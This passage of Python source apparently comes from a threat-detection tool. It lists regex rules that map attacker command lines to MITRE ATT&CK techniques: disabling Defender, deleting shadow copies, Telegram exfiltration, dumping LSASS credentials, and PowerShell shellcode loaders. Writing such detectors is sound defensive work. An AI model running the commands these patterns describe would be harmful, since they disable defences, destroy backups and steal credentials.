    (r"%APPDATA%\\Microsoft\\Windows\\Start\s+Menu\\Programs\\Startup\\[^\\/\s]+\.lnk|"
     r"AppData\\Roaming\\Microsoft\\Windows\\Start\s+Menu\\Programs\\Startup\\.*?\.lnk",
        ("T1547.001", "Startup Folder .lnk shortcut persistence", "Persistence")),
    (r"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[A-Za-z_][A-Za-z0-9_]*|"
     r"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\",
        ("T1547.001", "HKCU Run key persistence", "Persistence")),
    (r"IconLocation\s*=\s*[\"']?[^\"'\n]{0,120}?(?:msedge|iexplore|chrome|firefox|acrobat)\.exe",
        ("T1036.005", "Masquerading: LNK IconLocation browser/reader impersonation", "Defense Evasion")),
    (r"cleanup\.bat[^\n]{0,200}?(?:del|erase|rd)\s+/[qs]\s+[\"']?%~dp0|"
     r"timeout\s+/t\s+\d+\s+&&?\s+del\s+.*?service\.json",
        ("T1070.004", "cleanup.bat self-delete + config wipe (SheetAgent/APT36)", "Defense Evasion")),
    # ─── LegacyHive EoP — Windows userprofile-service arbitrary hive ────
    (r"\bLegacyHive(?:\.exe|\.cpp)?\b|"
     r"\bRegLoadKey\w*\s*\(|\bRegLoadAppKey\s*\(|"
     r"reg(?:\.exe)?\s+load\s+HK(?:CU|LM|CR)\\[^\s]+\s+[a-z]:\\[^\s]+\.(?:dat|hiv|hive)\b",
        ("T1068", "Exploitation for Privilege Escalation (LegacyHive-style hive load)", "Privilege Escalation")),
    (r"usrclass\.dat[^\n]{0,80}?(?:reg\s+load|RegLoadKey|NtLoadKey|LoadHive)",
        ("T1112", "Modify Registry (arbitrary hive-file mount)", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Finger protocol ClickFix (BleepingComputer)
    # ═══════════════════════════════════════════════════════════════════
    (r"\bfinger(?:\.exe)?\s+[A-Za-z0-9_.\-]+@[A-Za-z0-9.\-]+\s*(?:\||\|\|)\s*cmd",
        ("T1059.003", "Finger protocol piped to cmd — ClickFix LOLBIN abuse", "Execution")),
    (r"\bfinger(?:\.exe)?\s+[A-Za-z0-9_.\-]+@[A-Za-z0-9.\-]+",
        ("T1105", "Ingress Tool Transfer via Finger protocol (TCP/79 LOLBIN)", "Command and Control")),
    (r"finger://[A-Za-z0-9.\-]+",
        ("T1071", "Application Layer Protocol: Finger", "Command and Control")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · GitHub Actions supply-chain (Wiz M&M)
    # ═══════════════════════════════════════════════════════════════════
    (r"on:\s*pull_request_target\b|pull_request_target:",
        ("T1195.002", "Supply Chain Compromise: pull_request_target GitHub Actions trigger", "Initial Access")),
    (r"uses:\s+[A-Za-z0-9_\-]+/[A-Za-z0-9_\-]+@(?:main|master|dev)\b",
        ("T1195.002", "Unpinned GitHub Action reference (@main/@master/@dev) — supply-chain risk", "Initial Access")),
    (r"(?:secrets\.[A-Z_]+|GITHUB_TOKEN|ACTIONS_RUNTIME_TOKEN)[^\n]{0,300}?"
     r"(?:curl|wget|python|node|powershell|nc|bash)\s+.*?https?://",
        ("T1195.002", "GitHub Actions secret exfiltration via curl/wget/nc", "Initial Access")),
    (r"actions/checkout@[^\s]*\s+.*?ref:\s+\$\{\{\s*github\.event\.pull_request\.head\.sha",
        ("T1195.002", "actions/checkout with attacker-controlled PR head SHA (Wiz M&M tradecraft)", "Initial Access")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · npm / JS supply-chain (Socket Jscrambler)
    # ═══════════════════════════════════════════════════════════════════
    (r"[\"']postinstall[\"']\s*:\s*[\"'](?:node|npm|npx|curl|wget|bash|sh|python)\s+",
        ("T1195.001", "npm postinstall hook running arbitrary code (JS supply-chain)", "Initial Access")),
    (r"npm\s+(?:install|i)\s+.*?--(?:ignore-scripts=false|allow-scripts)|"
     r"npm\s+publish\s+.*?--access\s+public",
        ("T1195.001", "npm install/publish with script-enabling flag (supply-chain marker)", "Initial Access")),
    (r"\b(?:jscrambler|obfuscator\.io|javascript-obfuscator)\b[^\n]{0,80}?(?:transform|obfuscate|encode)",
        ("T1027", "JavaScript obfuscation tool signature (Jscrambler/obfuscator.io)", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Ransomware EDR/AV kill + destruction
    # ═══════════════════════════════════════════════════════════════════
    (r"Set-MpPreference\s+.*?(?:-DisableRealtimeMonitoring|-DisableIOAVProtection|"
     r"-DisableBehaviorMonitoring|-DisableScriptScanning|-DisableIntrusionPreventionSystem|"
     r"-DisableBlockAtFirstSeen|-ExclusionPath|-ExclusionExtension)\s+\$true",
        ("T1562.001", "Impair Defenses: Disable Windows Defender (Set-MpPreference)", "Defense Evasion")),
    (r"(?:taskkill|Stop-Process)[^\n]{0,60}?/(?:IM|Name)\s+(?:MsMpEng|MpDefenderCoreService|"
     r"CSFalconService|SentinelAgent|MBAMService|windefend|WinDefend|CylanceSvc|"
     r"BDServicesHost|EPProtectedService|ekrn|avast|avg|kaspersky|nortons?ecurity|"
     r"trendmicro|sophos|carbonblack|cyren)",
        ("T1562.001", "EDR/AV process kill (ransomware pre-encryption stage)", "Defense Evasion")),
    (r"sc(?:\.exe)?\s+(?:stop|delete|config)\s+(?:WinDefend|MpKsl|Sense|CSFalconService|"
     r"SentinelAgent|MBAMService|CylanceSvc|BDESVC|MpsSvc|WdNisSvc)",
        ("T1562.001", "sc.exe stop/delete/config on security service (EDR-disable)", "Defense Evasion")),
    (r"wevtutil\s+(?:cl|clear-log)\s+(?:System|Security|Application|Microsoft-Windows-[A-Za-z\-]+)|"
     r"Clear-EventLog\s+.*?(?:-LogName|Security|System|Application)",
        ("T1070.001", "Event Log clearing (post-encryption cleanup)", "Defense Evasion")),
    (r"vssadmin(?:\.exe)?\s+delete\s+shadows\b|"
     r"wmic\s+shadowcopy\s+delete\b|"
     r"Get-WmiObject\s+Win32_Shadowcopy.*?\.Delete\(\)",
        ("T1490", "Inhibit System Recovery: Delete Volume Shadow Copies (ransomware pre-encrypt)", "Impact")),
    (r"bcdedit(?:\.exe)?\s+/set\s+.*?(?:bootstatuspolicy\s+ignoreallfailures|recoveryenabled\s+no)",
        ("T1490", "Inhibit System Recovery: Disable Windows Recovery Environment", "Impact")),
    (r"wbadmin(?:\.exe)?\s+delete\s+(?:catalog|backup|systemstatebackup)",
        ("T1490", "Inhibit System Recovery: Delete Windows Backup", "Impact")),
    # Everest ransomware markers
    (r"\bEverest[_\-]?(?:Locker|Ransom|Team)\b|"
     r"README_TO_RESTORE\.(?:txt|html)|_HOW_TO_RECOVERY_FILES_",
        ("T1486", "Data Encrypted for Impact (Everest ransomware markers)", "Impact")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Gamarue/Andromeda worm (RedCanary)
    # ═══════════════════════════════════════════════════════════════════
    (r"autorun\.inf[^\n]{0,80}?open\s*=|"
     r"\bandromeda\b|\bgamarue\b|\bWauchos?\b",
        ("T1091", "Replication Through Removable Media (Gamarue/Andromeda autorun.inf)", "Lateral Movement")),
    (r"rundll32(?:\.exe)?\s+.*?,\s*(?:AndromedaEntry|SetupObject|_bo\d+|Install|DllInstall)",
        ("T1218.011", "Rundll32 with Gamarue-family export names", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · VMware ESXi hypervisor exploit (Ars Technica)
    # (CVE-2024-37085 domain-group escalation & related ESXi post-exploit)
    # ═══════════════════════════════════════════════════════════════════
    (r"\besxcli\s+(?:vm|network|storage|system)\s+",
        ("T1059", "ESXi shell command (esxcli) — hypervisor post-exploitation", "Execution")),
    (r"\bvim-cmd\s+(?:vmsvc|hostsvc|solo)/",
        ("T1059", "ESXi vim-cmd — VM lifecycle manipulation from hypervisor", "Execution")),
    (r"\b\/etc\/ssh\/sshd_config[^\n]{0,60}?ESXi|"
     r"\bpython\s+-c\s+.*?os\.execv\(.*?/bin/sh|"
     r"\bchmod\s+\+x\s+/tmp/[a-z0-9]{4,}\.sh",
        ("T1059.004", "ESXi shell drop / execute (hypervisor post-exploit)", "Execution")),
    (r"ESX\s+Admins?\b|ESX\s+Admins\s+group|"
     r"\bAD-integrated\s+ESXi\b|"
     r"CVE-2024-37085",
        ("T1078.002", "ESXi 'ESX Admins' AD-group escalation (CVE-2024-37085)", "Privilege Escalation")),
    (r"vmsvc/(?:snapshot|power\.off|unregister|destroy)\.(?:create|remove)",
        ("T1490", "ESXi VM snapshot/unregister/destroy — ransomware pre-encrypt on hypervisor", "Impact")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · TrendMicro Patriot Bait (AI-built C&C)
    # ═══════════════════════════════════════════════════════════════════
    # Fixed 5-sec polling to /api/v1/update — canonical Patriot Bait beacon
    (r"/api/v1/(?:update|telemetry|agents|interact)\b",
        ("T1071.001", "AI-generated C&C API endpoint (/api/v1/update|telemetry|agents|interact)", "Command and Control")),
    (r"X-Agent-ID\s*:\s*\$env:COMPUTERNAME|X-Agent-ID\s*:\s*[^\n]{0,60}?_[A-Za-z0-9]+",
        ("T1071.001", "Custom X-Agent-ID HTTP header — Patriot Bait beacon signature", "Command and Control")),
    (r"Start-Sleep\s+-Seconds?\s+5[^\n]{0,120}?Invoke-WebRequest.*?/api/v1/",
        ("T1071.001", "PowerShell 5-second polling loop to /api/v1/ — AI botnet beacon", "Command and Control")),
    (r"%APPDATA%\\Microsoft\\Windows\\Runtime\\svchost\.exe|"
     r"AppData\\Roaming\\Microsoft\\Windows\\Runtime\\svchost\.exe",
        ("T1036.005", "svchost.exe in non-standard Runtime path (Patriot Bait persistence)", "Defense Evasion")),
    (r"Win32_PerfFormattedData_PerfOS_System",
        ("T1546.003", "WMI Event Subscription: Win32_PerfFormattedData_PerfOS_System (Patriot Bait)", "Persistence")),
    (r"%TEMP%\\win_update_svc_[A-Za-z0-9]+\.ps1|Temp\\win_update_svc_",
        ("T1105", "win_update_svc_*.ps1 in %TEMP% — Patriot Bait payload marker", "Command and Control")),
    (r"HKCU:\\Environment\\UserInitMprLogonScript|"
     r"HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript",
        ("T1037.001", "UserInitMprLogonScript registry persistence (non-admin logon script)", "Persistence")),
    (r"OneDrive\s+Standalone\s+Update\s+Task-S-1-5-21-",
        ("T1053.005", "Scheduled Task masquerade: OneDrive Standalone Update Task-S-1-5-21-*", "Persistence")),
    (r"GEMINI\.md|SKILL\.md|C2_MIGRATION_GUIDE\.md",
        ("T1027", "AI-skill-file markers (GEMINI.md / SKILL.md / C2_MIGRATION_GUIDE.md)", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · ClickLock macOS ClickFix stealer
    # ═══════════════════════════════════════════════════════════════════
    # LaunchAgent plist names (com.authirity.plist / com.chromer.plist)
    (r"com\.(?:authirity|chromer)\.plist|"
     r"~/Library/LaunchAgents/com\.(?:authirity|chromer)\.plist",
        ("T1543.001", "ClickLock macOS LaunchAgent persistence (com.authirity/com.chromer)", "Persistence")),
    # Forced password-dialog kill loop
    (r"(?:while|repeat)[^\n]{0,80}?(?:osascript|do\s+shell\s+script)[^\n]{0,120}?"
     r"display\s+dialog[^\n]{0,120}?(?:password|Keychain|Chrome\s+Safe\s+Storage)",
        ("T1056.002", "macOS forced-password-dialog loop (ClickLock coercion tradecraft)", "Credential Access")),
    (r"(?:killall|pkill)\s+.*?(?:Finder|Dock|Activity\s+Monitor|Console|System\s+Settings|Spotlight)"
     r"[^\n]{0,120}?(?:sleep\s+0\.[0-9]+|osascript)",
        ("T1499.001", "macOS process-kill loop (ClickLock 210ms/200ms coercion cycle)", "Impact")),
    # Chrome Safe Storage keychain access
    (r"security\s+find-generic-password\s+.*?Chrome\s+Safe\s+Storage|"
     r"\bChrome\s+Safe\s+Storage\s+key\b",
        ("T1555.001", "Chrome Safe Storage key theft from macOS Keychain (ClickLock)", "Credential Access")),
    # Fake Cloudflare terminal captcha
    (r"(?:Verifying\s+you\s+are\s+human|Cloudflare\s+security\s+check|"
     r"[▓█▒░]{10,})",
        ("T1204.002", "Fake Cloudflare 'human verification' terminal progress-bar (ClickFix)", "Execution")),
    # Telegram Bot API exfil (macOS + Windows both)
    (r"https?://api\.telegram\.org/bot[0-9]+:[A-Za-z0-9_\-]{20,}/(?:sendDocument|sendMessage|sendPhoto)",
        ("T1567", "Exfiltration via Telegram Bot API (ClickLock, Amos, StealC, Lumma)", "Exfiltration")),
    # GSocket backdoor
    (r"\bgsocket\b|gs-netcat|gs\.uk/y[^\n]{0,20}?\.sh",
        ("T1071.001", "GSocket relay backdoor (ClickLock persistent RAT)", "Command and Control")),
    (r"osascript\s+-e\s+.*?tell\s+application\s+\"Terminal\"|"
     r"clear\s+&&\s+printf\s+.*?\\033\[[?A-Za-z0-9;]+",
        ("T1059.002", "AppleScript telling Terminal + ANSI escape spam (ClickLock UX-lockout)", "Execution")),
    # Kill NotificationCenter (silent operation)
    (r"killall\s+NotificationCenter\b|"
     r"launchctl\s+kickstart\s+.*?com\.apple\.notificationcenterui",
        ("T1562.008", "NotificationCenter suppression (ClickLock covert operation)", "Defense Evasion")),

    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Excel-batch gap coverage (real-world payloads)
    # ═══════════════════════════════════════════════════════════════════
    # Python base64 exec — canonical Python living-off-the-land dropper
    (r"python(?:3|3\.\d+|w)?\s+(?:-c|-m\s+base64|-B\s+)?[\"']?exec\s*\(\s*__import__\s*\(\s*[\"']base64[\"']\s*\)\.b64decode\s*\(",
        ("T1059.006", "Python -c exec base64 b64decode — LOTL dropper", "Execution")),
    (r"python(?:3|3\.\d+|w)?\s+(?:-c|-m|-B)\s+.*?base64\.(?:b64decode|urlsafe_b64decode)",
        ("T1027.010", "Python base64 in-line decode — obfuscated execution", "Defense Evasion")),
    # Offensive-toolkit script names (PowerSploit / PowerView / Rubeus / Mimikatz / etc.)
    (r"\b(?:PowerView|PowerSploit|Invoke-Kerberoast|Invoke-Mimikatz|Rubeus|SharpHound|"
     r"BloodHound|Certify|SafetyKatz|SharpKatz|CrackMapExec|CME|Impacket|GetUserSPNs|"
     r"secretsdump|psexec\.py|smbexec\.py|Ghostpack|Seatbelt|Whisker|StandIn|ADSearch|"
     r"SharpRoast|SharpDPAPI|SharpChisel|SharpSocks|Rubeus\.exe|Mimikatz\.exe|nanodump)"
     r"(?:\.ps1|\.py|\.exe)?\b",
        ("T1588.002", "Obtain Capabilities: Tool — Offensive-security tool signature", "Resource Development")),
    # UNC-path execution (SMB share) + rundll32/pushd
    (r"pushd\s+\\\\[a-z0-9\-\.]+\\[^\s\"']+|"
     r"rundll32(?:\.exe)?\s+.*?\\\\[a-z0-9\-\.]+\\[^\s,]+",
        ("T1021.002", "SMB/Windows Admin Shares: UNC-path execution via pushd/rundll32", "Lateral Movement")),
    # schtasks REMOTE (/s <host>) — task creation on remote machine
    (r"schtasks(?:\.exe)?\s+.*?/s\s+[\w\.\-]{3,}\s+.*?/tn\s+[\"']?[\w\-]+[\"']?\s+/tr",
        ("T1053.005", "Scheduled Task creation on REMOTE host via schtasks /s", "Persistence")),
    # PowerShell PSRemoting enablement
    (r"Enable-PSRemoting\b|winrm(?:\.exe)?\s+(?:quickconfig|set\s+winrm/config)",
        ("T1021.006", "Enable-PSRemoting / winrm quickconfig — remote PowerShell setup", "Lateral Movement")),
    # UAC / EnableLUA registry disable
    (r"HK(?:LM|EY_LOCAL_MACHINE)\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System.*?"
     r"EnableLUA.*?REG_DWORD.*?/d\s+0|"
     r"reg\s+add\s+.*?EnableLUA\s+/t\s+REG_DWORD\s+/d\s+0",
        ("T1548.002", "Bypass User Account Control: Disable EnableLUA registry", "Privilege Escalation")),
    # Windows Firewall disable
    (r"sc(?:\.exe)?\s+(?:stop|delete|config)\s+(?:MpsSvc|BFE|LanmanServer)|"
     r"netsh(?:\.exe)?\s+advfirewall\s+set\s+.*?state\s+off|"
     r"Set-NetFirewallProfile\s+.*?-Enabled\s+False",
        ("T1562.004", "Impair Defenses: Disable/Modify Windows Firewall", "Defense Evasion")),
    # RMM tool markers — AnyDesk / QuickAssist / TeamViewer / ScreenConnect / Atera / Splashtop
    (r"(?:AnyDesk(?:\.exe)?|QuickAssist(?:\.exe)?|TeamViewer(?:\.exe|_Service)?|"
     r"ScreenConnect(?:\.ClientService)?|LabTech|Atera(?:Agent)?|NinjaOne|NinjaRMM|"
     r"Splashtop|LogMeIn|ConnectWise\s+(?:Control|Automate)|"
     r"KaseyaVSA|GoTo(?:Assist|Resolve))",
        ("T1219", "Remote Access Software (RMM tool identifier)", "Command and Control")),
    (r"--install\s+[\"']?c:\\AnyDesk\\[\"']?.*?--(?:start-with-win|silent|set-password)",
        ("T1219", "AnyDesk silent install with persistence + password (RMM abuse)", "Command and Control")),
    # QuickAssist / RemoteAssistance
    (r"MicrosoftCorporationII\.QuickAssist_.*?QuickAssist\.exe",
        ("T1219", "Windows QuickAssist RMM (T1219) — abused in Storm-1811 tradecraft", "Command and Control")),
    # ScreenConnect ClientService with PDF/PDL args
    (r"ScreenConnect\.ClientService\.exe.*?(?:-e=SessionType|--session|-s=|--host)",
        ("T1219", "ScreenConnect ClientService with session-type args (RMM tradecraft)", "Command and Control")),
    # WebDAV mount / http share
    (r"net(?:\.exe)?\s+use\s+[A-Z]:\s+https?://[^\s]+\s+/persistent:no",
        ("T1105", "net use → HTTP/WebDAV share (payload staging via WebDAV)", "Command and Control")),
    # -EncodedCommand with 40+ base64 chars → PowerShell downloader
    (r"powershell(?:\.exe)?\s+(?:-\S+\s+){1,6}-e(?:c|nc|ncodedcommand)\s+[A-Za-z0-9+/=]{60,}",
        ("T1027.010", "PowerShell -EncodedCommand with long base64 payload", "Defense Evasion")),
    # msiexec /i https:// remote-msi with e/y query params (evasion)
    (r"msiexec(?:\.exe)?\s+.*?/i\s+https?://[^\s]+\.msi\?e=[^\s]+&y=Guest",
        ("T1218.007", "msiexec /i remote MSI with e=/y=Guest evasion params", "Defense Evasion")),
    # VirtualBox VBoxManage (hypervisor abuse — VM sandbox escape/attack VMs)
    (r"VBoxManage(?:\.exe)?\s+(?:startvm|controlvm|import|export|snapshot|clonevm)",
        ("T1497", "VBoxManage — VirtualBox VM control (sandbox-evasion / VM attack)", "Defense Evasion")),
    # Tor / anonymizer runtime
    (r"[a-z]:\\Users\\[^\\]+\\AppData\\[^\\]+\\[^\\]+\\runtime\\tor\\torrc|"
     r"\btor(?:\.exe)?\s+-f\s+.*?torrc",
        ("T1090.003", "Tor Multi-hop Proxy — anonymized C2 (torrc config detected)", "Command and Control")),
    # Local Volume Shadow deletion with specific shadow ID
    (r"vssadmin(?:\.exe)?\s+Delete\s+Shadows\s+/Shadow=\{[a-f0-9\-]+\}\s+/Quiet",
        ("T1490", "vssadmin Delete Shadows /Shadow={GUID} — ransomware/anti-forensics", "Impact")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Phantom Squatting (Unit42) + Montana Empire
    # ═══════════════════════════════════════════════════════════════════
    (r"Kimseye\s+G[üu]venme|ENTER\s+THE\s+EMPIRE|Montana\s+Empire\s+(?:Panel|Kit|Admin)",
        ("T1566.002", "Montana Empire phishing-kit control-panel markers", "Initial Access")),
    (r"[a-z0-9\-]+post-app\.(?:com|net|org|io)|[a-z0-9\-]+-portal-support\.(?:com|net|io)",
        ("T1583.001", "Phantom Squatting: hallucinated brand-portal domain pattern", "Resource Development")),
    (r"(?:admin|sandbox|billing|api|dashboard|checkout)\.[a-z0-9\-]{4,30}\.(?:com|net|io)/(?:v\d+/)?(?:login|auth|pay|api)",
        ("T1583.001", "AI-hallucinated brand subdomain (phantom-squat pattern)", "Resource Development")),
    (r"api\.telegram\.org/bot[0-9]+:[A-Za-z0-9_\-]{20,}/(?:sendDocument|sendMessage|forwardMessage)",
        ("T1567", "Telegram Bot API — OTP/credential relay (Montana Empire tradecraft)", "Exfiltration")),
    (r"\.(?:cursorrules|windsurf|copilot-instructions\.md|\.aider\.chat\.history)|"
     r"\.vscode/settings\.json[^\n]{0,60}?(?:cline|codeium|copilot|cursor)",
        ("T1588.002", "AI-coding-assistant project artefacts in payload (Montana Empire ZIP signature)", "Resource Development")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0-preview · Fragment-mode heuristics
    # (Match argument-only command-line fragments even when the host
    # LOLBin has been sliced off — critical for partial telemetry, EDR
    # process-tree fragments, and analyst-pasted command excerpts.)
    # ═══════════════════════════════════════════════════════════════════
    # Bare -EncodedCommand / -e / -ec / -enc … with base64 tail
    (r"(?:^|[\s\"'])-e(?:c|nc|ncoded|ncodedc|ncodedcommand)?\s+[A-Za-z0-9+/=]{24,}",
        ("T1059.001", "PowerShell -EncodedCommand fragment (no host binary present)", "Execution")),
    (r"(?:^|[\s\"'])-e(?:c|nc|ncoded|ncodedc|ncodedcommand)?\s+[A-Za-z0-9+/=]{60,}",
        ("T1027.010", "PowerShell -EncodedCommand fragment — long base64 payload", "Defense Evasion")),
    # Bare -Command "IEX(...)" / -c "IEX ..." fragment
    (r"(?:^|[\s\"'])-c(?:ommand)?\s+[\"']?[^\"'\r\n]{0,120}?(?:iex|invoke-expression|downloadstring|invoke-webrequest|net\.webclient|start-bitstransfer)",
        ("T1059.001", "PowerShell -Command fragment invoking IEX / download-and-execute", "Execution")),
    # Bare cmd fragment: /c or /k with chained commands
    (r"(?:^|[\s\"'])/[cCkK]\s+[\"']?[^\"'\r\n]{0,200}?(?:&&|\|\||\bstart\b|\bpowershell\b|\bcurl\b|\bcertutil\b|\bbitsadmin\b|\bmshta\b|\breg\s+add\b|\brundll32\b|\btasklist\b|\bcomsvcs\b|\bwmic\b|\bnet\s+use\b|\bschtasks\b|\bvssadmin\b|\bfor\s+/f\b)",
        ("T1059.003", "cmd /c or /k fragment chaining execution primitives", "Execution")),
    # Bare certutil-style fragments (arguments only)
    (r"(?:^|[\s\"'])-urlcache\s+(?:-\S+\s+){0,3}-f\s+https?://",
        ("T1105", "certutil -urlcache -f fragment (download via LOLBIN args)", "Command and Control")),
    (r"(?:^|[\s\"'])-decode(?:hex)?\s+[\"']?[a-z0-9_.\\/\-]{3,}[\"']?\s+[\"']?[a-z0-9_.\\/\-]{3,}[\"']?",
        ("T1140", "certutil -decode fragment (base64/hex decode of staged file)", "Defense Evasion")),
    # Bare bitsadmin fragment
    (r"(?:^|[\s\"'])/transfer\s+\S+\s+https?://\S+\s+\S+",
        ("T1197", "bitsadmin /transfer fragment (BITS-job download)", "Command and Control")),
    # Bare mshta fragment (URL argument w/o host binary)
    (r"(?:^|[\s\"'])(?:javascript:|vbscript:)[^\r\n]{0,200}?(?:GetObject|WScript|ActiveXObject|eval|CreateObject)",
        ("T1218.005", "mshta-style javascript:/vbscript: URI fragment", "Defense Evasion")),
    # Bare rundll32 fragment (DLL,Entry pattern) — accepts named or ordinal exports (#+000024)
    (r"(?:^|[\s\"'])[\"']?[a-z]:\\[^\"'\r\n]{2,200}?\.dll[\"']?,\s*(?:[A-Za-z_@#][A-Za-z0-9_@#]{2,60}|#\+?[0-9A-Fa-f]{2,10})",
        ("T1218.011", "rundll32-style DLL,ExportedFunction fragment (named or ordinal)", "Defense Evasion")),
    # comsvcs.dll ordinal MiniDump — LSASS credential-dumping tradecraft
    (r"comsvcs\.dll[\"']?,\s*#\+?[0-9]{2,10}",
        ("T1003.001", "comsvcs.dll ordinal MiniDump — LSASS credential dumping", "Credential Access")),
    # Bare reg-add persistence key fragment
    (r"(?:^|[\s\"'])add\s+[\"']?HK(?:LM|CU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        ("T1547.001", "reg add HKCU/HKLM ...\\Run persistence fragment", "Persistence")),
    # Bare schtasks / at.exe scheduling fragment
    (r"(?:^|[\s\"'])/create\s+/tn\s+[\"']?\S+[\"']?\s+/tr\s+",
        ("T1053.005", "schtasks /create /tn /tr fragment (scheduled-task persistence)", "Persistence")),
    # Bare wmic process-call fragment
    (r"(?:^|[\s\"'])process\s+call\s+create\s+[\"']?[^\"'\r\n]{0,200}?(?:powershell|cmd|cscript|wscript|mshta|rundll32)",
        ("T1047", "wmic process call create fragment (remote/local process spawn)", "Execution")),
    # Bare vssadmin shadow-copy delete fragment
    (r"(?:^|[\s\"'])delete\s+shadows\s+/all\s+/quiet",
        ("T1490", "vssadmin delete shadows /all /quiet fragment (ransom precursor)", "Impact")),
    # Bare -NoP / -NoProfile / -W Hidden / -EP Bypass stealth combo (fragment)
    (r"(?:^|[\s])(?:-nop|-noprofile)\s+(?:-\S+\s+){0,4}(?:-w(?:indowstyle)?\s+hidden|-ep\s+bypass|-executionpolicy\s+bypass)",
        ("T1059.001", "PowerShell stealth-flag fragment (-NoP -W Hidden -EP Bypass)", "Execution")),
    # Standalone very-long base64 blob (>= 200 chars) with typical PowerShell UTF-16LE prefix
    (r"(?:^|[\s\"'=])[A-Za-z0-9+/]{200,}={0,2}(?:\s|$|['\"])",
        ("T1027", "Standalone long base64 blob (>=200 chars) — likely encoded payload", "Defense Evasion")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0 · Cobalt Strike / Metasploit shellcode loader
    # ═══════════════════════════════════════════════════════════════════
    # `[Byte[]]$var_code = [System.Convert]::FromBase64String(...)` — the
    # canonical CS/MSF PowerShell shellcode-loader stub. The `$var_code`
    # variable name is a fingerprint used in nearly every CS profile.
    (r"\[Byte\[\]\]\s*\$(?:var_)?(?:code|shellcode|buf|payload|sc)\s*=\s*\[(?:System\.)?Convert\]::FromBase64String",
        ("T1055", "PowerShell byte-array shellcode buffer (CS/MSF loader pattern)", "Defense Evasion")),
    (r"\[Byte\[\]\]\s*\$(?:var_)?(?:code|shellcode|buf|payload|sc)\s*=\s*\[(?:System\.)?Convert\]::FromBase64String",
        ("T1620", "Reflective code loading — PowerShell byte-array + FromBase64String", "Defense Evasion")),
    # CS `var_` prefix naming convention (Malleable C2 profile)
    (r"\$var_(?:code|key|iv|k|s|xor|shellcode|payload|buf)",
        ("T1027", "Cobalt Strike Malleable C2 variable naming (`$var_*`)", "Defense Evasion")),
    # PowerShell VirtualAlloc + memcpy shellcode injection primitive
    (r"VirtualAlloc\s*\([^)]*(?:0x40|64)\s*\)|"
     r"\[System\.Runtime\.InteropServices\.Marshal\]::(?:Copy|GetDelegateForFunctionPointer)|"
     r"CreateThread\s*\(\s*(?:IntPtr\.Zero|0)",
        ("T1055.002", "PowerShell VirtualAlloc/CreateThread shellcode injection primitive", "Defense Evasion")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0 · PowerShell-syntax fragments (no `powershell.exe`)
    # Fixes the class of payloads where the PowerShell interpreter host
    # is implicit (e.g., piped from another script) but the cmdlet syntax
    # is unmistakable.
    # ═══════════════════════════════════════════════════════════════════
    # Invoke-WebRequest / Invoke-RestMethod / iwr / irm — download primitive
    (r"(?<![A-Za-z0-9_])(?:Invoke-WebRequest|Invoke-RestMethod|\biwr\b|\birm\b)\s+[^\r\n]{0,200}?-Uri\s+[\$\"']?https?://",
        ("T1059.001", "PowerShell Invoke-WebRequest/IRM download cmdlet", "Execution")),
    (r"(?<![A-Za-z0-9_])(?:Invoke-WebRequest|Invoke-RestMethod|\biwr\b|\birm\b)\s+[^\r\n]{0,200}?-(?:Uri|OutFile)\s+",
        ("T1105", "PowerShell Invoke-WebRequest/IRM — Ingress Tool Transfer", "Command and Control")),
    # Net.WebClient / DownloadFile / DownloadString — legacy PS download
    (r"(?:New-Object\s+)?(?:System\.)?Net\.WebClient|\.DownloadString\s*\(|\.DownloadFile\s*\(",
        ("T1105", "PowerShell Net.WebClient .DownloadString/.DownloadFile", "Command and Control")),
    (r"(?:New-Object\s+)?(?:System\.)?Net\.WebClient|\.DownloadString\s*\(|\.DownloadFile\s*\(",
        ("T1059.001", "PowerShell Net.WebClient download primitive", "Execution")),
    # Start-Process / saps — user-execution primitive
    (r"(?<![A-Za-z0-9_])(?:Start-Process|\bsaps\b)\s+[^\r\n]{0,200}?(?:\.exe|\$\w+|['\"][A-Za-z]:\\)",
        ("T1204.002", "PowerShell Start-Process user-execution primitive", "Execution")),
    (r"(?<![A-Za-z0-9_])(?:Start-Process|\bsaps\b)\s+",
        ("T1059.001", "PowerShell Start-Process cmdlet (no PS host prefix)", "Execution")),
    # Get-Random used to name a payload file (staging obfuscation)
    (r"\$\(?Get-Random\)?[^\r\n]{0,60}?\.exe|\.exe[^\r\n]{0,60}?\$\(?Get-Random",
        ("T1027", "PowerShell $(Get-Random).exe staging — filename obfuscation", "Defense Evasion")),
    # Random-looking PowerShell variable names (heuristic: 5+ chars, mixed letter+digit, no dict word)
    (r"\$[a-z]{2,4}[0-9]{2,4}[a-z]*\s*=\s*['\"]https?://",
        ("T1027", "PowerShell randomized variable name assigned a URL", "Defense Evasion")),
    # PowerShell comment tag `<# random #>` — used as tradecraft marker
    (r"<#\s*[a-z0-9]{4,8}\s*#>",
        ("T1027", "PowerShell junk-comment tradecraft marker `<# tag #>`", "Defense Evasion")),
    # Staging path in AppData\Local\Temp
    (r"C:\\Users\\Public\\AppData\\Local\\Temp\\|C:\\ProgramData\\|\\Windows\\Temp\\",
        ("T1074.001", "Local staging in Public/ProgramData/Temp directory", "Collection")),
    # ═══════════════════════════════════════════════════════════════════
    # Feb 2026 v1.3.0 · Sparse-tactic backfill (from heatmap self-audit)
